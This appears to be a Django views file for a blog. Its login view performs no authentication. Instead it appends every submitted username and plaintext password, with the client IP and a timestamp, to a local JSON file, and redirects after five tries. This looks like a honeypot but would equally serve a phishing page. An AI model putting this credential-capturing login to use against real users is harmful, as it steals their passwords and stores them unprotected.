import os
from django.shortcuts import redirect, render
from django.http import JsonResponse
import datetime
import json
from django.core.cache import cache


def blog(request):
    return render(request, 'blog/base.html')

MAX_LOGIN_ATTEMPTS = 5

def login_attempt(request):
    login_attempts = request.session.get('login_attempts', 0)

    if request.method == 'POST':
        if login_attempts >= MAX_LOGIN_ATTEMPTS:
            return redirect('blog')  # Redirect to blog page after 5 attempts
        
        username = request.POST.get('username')
        password = request.POST.get('password')

        user_ip = request.META.get('HTTP_X_FORWARDED_FOR')
        if user_ip is not None:
            ip = user_ip.split(',')[0]
        else:
            ip = request.META.get('REMOTE_ADDR')

        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        login_attempt_data = {
            "timestamp": timestamp,
            "ip": ip,
            "username": username,
            "password": password
        }

        # Write the login attempt data to a JSON file
        try:
            with open('login_attempts.json', 'a') as json_file:
                json.dump(login_attempt_data, json_file)
                json_file.write('\n')
        except Exception as e:
            # Handle any exceptions that might occur during file writing
            print("Error writing to JSON file:", e)

        login_attempts += 1
        request.session['login_attempts'] = login_attempts

        # Log the login attempt to the console or perform any additional actions
        cache.clear()

    return render(request, 'index.html')